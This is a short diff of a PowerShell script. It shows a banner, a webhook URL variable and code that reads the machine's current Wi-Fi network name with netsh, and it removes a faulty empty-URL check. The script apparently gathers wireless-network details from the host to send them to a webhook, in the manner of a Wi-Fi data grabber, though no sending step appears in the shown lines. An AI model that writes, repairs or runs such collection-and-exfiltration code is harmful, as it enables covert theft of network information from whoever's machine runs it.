@@ -9,7 +9,6 @@
 #   ###   ###   ########### ########## ##########
 
 $webhookUrl = "$wh"
-if ($webhookUrl = '') {exit}
 $ssid = netsh wlan show interface | Select-String -Pattern ' SSID '
 $ssid = [string]$ssid
 $pos = $ssid.IndexOf(':')
